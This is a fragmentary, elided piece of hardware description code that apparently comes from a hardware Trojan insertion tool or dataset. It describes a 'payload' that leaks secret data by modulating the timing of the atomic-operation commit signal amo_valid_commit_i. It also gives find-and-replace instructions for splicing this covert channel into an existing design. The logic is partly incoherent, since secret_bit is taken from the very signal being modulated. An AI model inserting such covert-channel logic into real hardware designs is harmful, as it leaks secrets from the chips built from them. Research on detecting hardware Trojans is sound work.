 ...
 * Payload: Modulate timing of amo_valid_commit_i based on secret data
 * 
...
assign secret_bit = amo_valid_commit_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of amo_valid_commit_i
//
// Integration Script Must Modify:
//
// IF amo_valid_commit_i is timing-sensitive:
//   Find: assign amo_valid_commit_i = ready_signal;
//   Replace: assign amo_valid_commit_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
